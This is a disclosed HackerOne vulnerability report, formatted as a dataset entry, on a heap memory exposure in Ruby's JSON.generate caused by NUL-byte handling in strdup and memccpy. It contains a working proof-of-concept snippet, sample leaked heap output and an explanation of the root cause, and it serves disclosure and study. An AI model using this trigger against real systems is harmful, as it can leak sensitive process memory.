---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '209949'
original_report_id: '209949'
title: Arbitrary heap exposure in JSON.generate
weakness: Memory Corruption - Generic
team_handle: ruby
created_at: '2017-03-01T22:55:39.657Z'
disclosed_at: '2017-09-25T12:32:43.247Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- memory-corruption-generic
---

# Arbitrary heap exposure in JSON.generate

## Metadata

- HackerOne Report ID: 209949
- Weakness: Memory Corruption - Generic
- Program: ruby
- Disclosed At: 2017-09-25T12:32:43.247Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Running this snippet can expose arbitrary memory:
```ruby
require 'json'

state = JSON.state.new
state.space = "\0" * 1024

puts JSON.generate({a: :b}, state)
```

```
{"a":
psych/handlers/recorder.rb
tensi0
reeze)
Gem::Specification.new do |s|
  # to objects of the same type as the original delegate.
mydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb
pass the namP
See http://guides.rubygems.org/specification-reference/ for help
#     # constant and class member data initialization...
"b"}
```


The issues lies in using `strdup` in [generator.c](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L1103), which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in `space_len`. Eventually `fbuffer_append` will copy the length of the string (e.g. the 1024 above) into the generated buffer.

Simpler snippets like `JSON.generate({foo: "bar"}, space: "\0" * 1024` suffer the same issue but for slightly different reason; as `fstrndup` is using [memccpy](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L311) which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
